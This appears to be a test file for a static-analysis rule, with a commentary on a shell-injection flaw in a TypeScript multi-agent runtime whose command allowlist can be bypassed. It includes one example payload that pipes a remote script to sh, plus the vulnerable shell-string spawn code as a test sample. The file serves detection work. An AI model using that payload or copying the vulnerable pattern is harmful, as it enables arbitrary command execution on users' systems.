# Rank 1435 / CVE-2026-54051 (jovancoding/network-ai, GHSA-qw6v-5fcf-5666,
# CWE-78): network-ai is a small TypeScript multi-agent runtime. `lib/agent-runtime.ts`
# gives an agent a shell tool through two classes. `SandboxPolicy.isCommandAllowed`
# decides whether a command string may run at all -- a blocklist first, then a
# glob allowlist whose entries are scoped prefixes such as `git *` or `npm run *`.
# `ShellExecutor.execute` calls that check and then hands the *same string* to
# `spawnCommand`, which ran it like this at the parent:
#
#   const isWindows = process.platform === 'win32';
#   const shell = isWindows ? 'cmd.exe' : '/bin/sh';
#   const shellArgs = isWindows ? ['/c', command] : ['-c', command];
#
#   const child = spawn(shell, shellArgs, { cwd, env, stdio: [...], windowsHide: true });
#
# The weakness in one sentence: the allowlist judges a flat string, and the
# string is then executed by a shell that reparses it. `git log; curl evil.sh |
# sh` matches the `git *` entry, and `/bin/sh -c` runs both halves. Everything
# the allowlist is for -- scoping an agent to `git`, to `npm run`, to `ls` -- is
# undone by one `;`, `|`, `&&`, `$(...)`, a backtick, a redirection or a newline,
# because none of those characters is what the allowlist looks at. In this
# runtime the command string is what an LLM or a peer agent asked for, so the
# reachable state is arbitrary command execution as the runtime's user.
#
# 379f77656b578144e03415c5b134d8309a4b5792 ("fix: v5.9.1 -- GHSA-qw6v-5fcf-5666
# shell command injection ... + permission_denied audit logging") stops using a
# shell. It adds `parseCommandLine`, which tokenises the string into an argv
# honouring quotes and reports whether any of `; & | $ ` ( ) < > { } \n \r`
# appeared outside quotes; `isCommandAllowed` rejects such a command before
# pattern matching; and `spawnCommand` becomes
#
#   const argv = this.policy.tokenizeCommand(command);
#   ...
#   const child = spawn(argv[0]!, argv.slice(1), { ..., shell: false });
#
# so no string is handed to an interpreter at all. The commit is informal and
# carries two unrelated changes beside the fixing change -- a version bump across sixteen
# documentation files, and a `_deny` helper in `scripts/check_permission.py`
# that logs a `permission_denied` audit event on each denial path. Neither is
# the CVE.
#
# The pool row is flagged `nocommit` and the flag is wrong for the eleventh
# time, this time in the plainest way available: `git clone` followed by
# `git show 379f77656b` prints the full diff on the first try, single parent,
# no merge, no preview ref. The vulnerable `spawn(shell, shellArgs)` is present
# at `<fix>^` and the `shell: false` argv form is present at `<fix>`. Nothing
# is reconstructed. The recorded CWE-78 is right.
#
# What fires without this, and why it is not coverage. `timeout 180
# ./bin/vyql scan --cache off --max-ram 6GB` over the whole repository reported
# 786 findings at the parent, among them a CRITICAL VYQL-INJ-002 whose sink is
# `code.CommandExecution @ lib/agent-runtime.ts:431` -- the vulnerable `spawn`
# line itself, reached by a 40-hop taint path through
# `ShellExecutor.execute#param#command`. It looks like coverage and is not: the
# *patched* revision reports the identical row at `lib/agent-runtime.ts:549`,
# because `command` still flows into `spawn(argv[0], argv.slice(1))`. The taint
# route cannot tell an argv execution from a shell-string execution, so it
# scores the remediation exactly as it scores the defect. 786 findings and 334
# at-or-above-high on both revisions, unchanged.
#
# The discriminating fact is the one the fixed revision deletes: a shell interpreter named
# as the program, with the shell's command-string flag as its first argument.
# `spawn('/bin/sh', ['-c', s])` and `spawn('cmd.exe', ['/c', s])` are the
# documented spelling of "run this string through a shell" -- Node's own
# `child_process` documentation contrasts them with `spawn(file, args)` and with
# `shell: true` -- so a binding naming them is written from the library's
# documentation, not from this commit. Nothing in it mentions `parseCommandLine`,
# `tokenizeCommand`, `SHELL_METACHARACTERS` or any other name the fixed revision
# introduced; renaming all four leaves the result unchanged.
#
# `commandStringWrapperExecution1035` (vyql/bindings/javascript/mfb63017a.vyql,
# appended at end of file) reuses `code.CommandStringWrapperExecution` -- whose
# review condition reads "a command execution wrapper receives one
# formatted shell command string instead of an argv array" -- rather than
# minting anything: VYQL-INJ-119 consumes it at CRITICAL/CWE-78 and
# VYQL-VAL-005 consumes it too, so it is not one of the inert concepts.
# Considered and rejected: `code.CommandAllowlistBeforeParsing`, whose evidence
# text is written for Go's `strings.Split`/`runner.ParseCommand` pair and whose
# allowlist half is in a sibling method the fixed revision does not touch, so it cannot
# discriminate; `code.DynamicCommandExec`, which is about assembling a string
# and would fire on both revisions; and a new sibling concept, which is what
# AGENTS.md calls ontology rot.
#
# Two engine facts the binding is shaped around, both re-measured here. The
# shell binary and the flag reach the function context as `literal:` tokens even
# though neither appears in the `spawn` call's own arguments -- JS emits no
# call-argument tokens at all (1360, 1388), so the ternaries that build `shell`
# and `shellArgs` are the only route. And `node.context.literal in [...]` is
# exact-token equality, not the substring match `containsAny` performs: a list
# of `["sh", "bash"]` matched n8n's `spawn('sh', ['-c', command], ...)` and did
# *not* match this file's `'/bin/sh'`, which is why both spellings are listed.
# The flag clause has to be exact for the same reason in the other direction --
# `contains "-c"` would match `--color`, `utf-8-check` and every other literal
# with those two characters in it.
#
# Discrimination, over three `--cache off` runs of each revision: the whole
# repository reports 790 findings and 338 at-or-above-high at the parent against
# 786/334 at the fixed revision, identical across all three runs. The delta is exactly this
# rank's: 2 VYQL-INJ-119 CRITICAL and 2 VYQL-VAL-005 rows on
# `lib/agent-runtime.ts`, 0 of each at the fixed revision. The pair of rows for one defect
# is the known JS nested-lambda artifact (1412, 1414): `spawnCommand` returns
# `new Promise((resolve, reject) => {...})`, and the outer function context
# inherits the inner lambda's tokens, so the same fact is attributed at
# `spawnCommand` and again at the lambda.
#
# Reach, measured rather than assumed, and the zero is near-vacuous. Across the
# 177 clones under /tmp/cve-work/rank*/ , 171 JavaScript/TypeScript files
# contain a `spawn`/`spawnSync` call at all; **7** of those also carry both a
# shell-binary literal and a `-c`/`/c` literal, which is the shape's entire
# reachable set. Two of the 7 are this rank's own target and repro. Of the
# remaining 5, four are vendored yarn release bundles
# (`.yarn/releases/yarn-4.0.2.cjs`, `yarn-4.6.0.cjs`, and two copies of
# `yarn-4.12.0.cjs` under mlflow) which flag 2 each -- yarn's own
# `/bin/sh -c` wrapper, which *does* shell-quote each operand with
# `.replace(/'/g, "'\\''")`, so those are the precision cost and are reported as
# such rather than hidden; and one is n8n's
# `packages/@n8n/computer-use/src/tools/shell/sandbox.ts`, whose `spawnShell`
# runs `spawn('sh', ['-c', command], { cwd })` on an LLM-supplied command and
# flags once. That one is the same weakness class deliberately, mitigated by
# sandboxing rather than by argv execution -- rank 1383's point that isolation
# limits blast radius without stopping the payload. So: the shape is rare in
# this corpus, not proven precise by it.
#
# The third case below is the one that is not vacuous. It spawns the same
# `/bin/bash` binary from the same function and is declined, because the
# argument is a script path and not the shell's command-string flag. That is
# what shows the binding keys on shell-string execution rather than on the name
# of a shell.

test "rank1435: the agent shell executor runs an allowlisted command string through /bin/sh -c"
  lang javascript
  file lib/agent-runtime.ts
  expect VYQL-INJ-119
  expect_review code.CommandStringWrapperExecution
  code
  ```
  import { spawn } from 'child_process';

  export class ShellExecutor {
    private policy: SandboxPolicy;
    private activeProcesses = 0;

    constructor(policy: SandboxPolicy) {
      this.policy = policy;
    }

    /** Execute a shell command within policy constraints */
    async execute(command: string, opts: ShellOptions = {}): Promise<ShellResult> {
      if (!this.policy.isCommandAllowed(command)) {
        throw new RuntimePolicyError(`Command blocked by policy: ${command}`);
      }

      const cwd = opts.cwd
        ? (this.policy.resolvePath(opts.cwd) ?? this.policy.basePath)
        : this.policy.basePath;

      this.activeProcesses++;
      try {
        return await this.spawnCommand(command, cwd, this.policy.defaultTimeoutMs, 65536, opts.env);
      } finally {
        this.activeProcesses--;
      }
    }

    private spawnCommand(
      command: string,
      cwd: string,
      timeoutMs: number,
      maxBytes: number,
      env?: Record<string, string>,
    ): Promise<ShellResult> {
      return new Promise((resolvePromise, reject) => {
        const isWindows = process.platform === 'win32';
        const shell = isWindows ? 'cmd.exe' : '/bin/sh';
        const shellArgs = isWindows ? ['/c', command] : ['-c', command];

        const child = spawn(shell, shellArgs, {
          cwd,
          env: env ? { ...process.env, ...env } : process.env,
          stdio: ['ignore', 'pipe', 'pipe'],
          windowsHide: true,
        });

        const timer = setTimeout(() => {
          child.kill('SIGTERM');
        }, timeoutMs);

        child.on('close', (code) => {
          clearTimeout(timer);
          resolvePromise({ stdout: '', stderr: '', exitCode: code ?? -1, timedOut: false });
        });
      });
    }
  }
  ```

test "rank1435: the same executor tokenising the command into an argv and spawning it without a shell"
  lang javascript
  file lib/agent-runtime.ts
  reject VYQL-INJ-119
  reject_review code.CommandStringWrapperExecution
  code
  ```
  import { spawn } from 'child_process';

  export class ShellExecutor {
    private policy: SandboxPolicy;
    private activeProcesses = 0;

    constructor(policy: SandboxPolicy) {
      this.policy = policy;
    }

    /** Execute a shell command within policy constraints */
    async execute(command: string, opts: ShellOptions = {}): Promise<ShellResult> {
      if (!this.policy.isCommandAllowed(command)) {
        throw new RuntimePolicyError(`Command blocked by policy: ${command}`);
      }

      const cwd = opts.cwd
        ? (this.policy.resolvePath(opts.cwd) ?? this.policy.basePath)
        : this.policy.basePath;

      this.activeProcesses++;
      try {
        return await this.spawnCommand(command, cwd, this.policy.defaultTimeoutMs, 65536, opts.env);
      } finally {
        this.activeProcesses--;
      }
    }

    private spawnCommand(
      command: string,
      cwd: string,
      timeoutMs: number,
      maxBytes: number,
      env?: Record<string, string>,
    ): Promise<ShellResult> {
      return new Promise((resolvePromise, reject) => {
        const argv = this.policy.tokenizeCommand(command);
        if (!argv || argv.length === 0) {
          reject(new RuntimePolicyError(
            `Command rejected — shell metacharacters are not permitted: ${command}`,
          ));
          return;
        }
        const file = argv[0]!;
        const args = argv.slice(1);

        const child = spawn(file, args, {
          cwd,
          env: env ? { ...process.env, ...env } : process.env,
          stdio: ['ignore', 'pipe', 'pipe'],
          windowsHide: true,
          shell: false,
        });

        const timer = setTimeout(() => {
          child.kill('SIGTERM');
        }, timeoutMs);

        child.on('close', (code) => {
          clearTimeout(timer);
          resolvePromise({ stdout: '', stderr: '', exitCode: code ?? -1, timedOut: false });
        });
      });
    }
  }
  ```

test "rank1435: a runner that spawns the shell binary to execute a script file rather than a command string"
  lang javascript
  file lib/script-runner.ts
  reject VYQL-INJ-119
  reject_review code.CommandStringWrapperExecution
  code
  ```
  import { spawn } from 'child_process';

  export class ScriptRunner {
    private policy: SandboxPolicy;

    constructor(policy: SandboxPolicy) {
      this.policy = policy;
    }

    runScript(scriptPath: string, args: string[], cwd: string, timeoutMs: number): Promise<ShellResult> {
      return new Promise((resolvePromise, reject) => {
        const resolved = this.policy.resolvePath(scriptPath);
        if (!resolved) {
          reject(new RuntimePolicyError(`Script outside sandbox: ${scriptPath}`));
          return;
        }

        const child = spawn('/bin/bash', [resolved, ...args], {
          cwd,
          env: process.env,
          stdio: ['ignore', 'pipe', 'pipe'],
          windowsHide: true,
        });

        const timer = setTimeout(() => {
          child.kill('SIGTERM');
        }, timeoutMs);

        child.on('close', (code) => {
          clearTimeout(timer);
          resolvePromise({ stdout: '', stderr: '', exitCode: code ?? -1, timedOut: false });
        });
      });
    }
  }
  ```
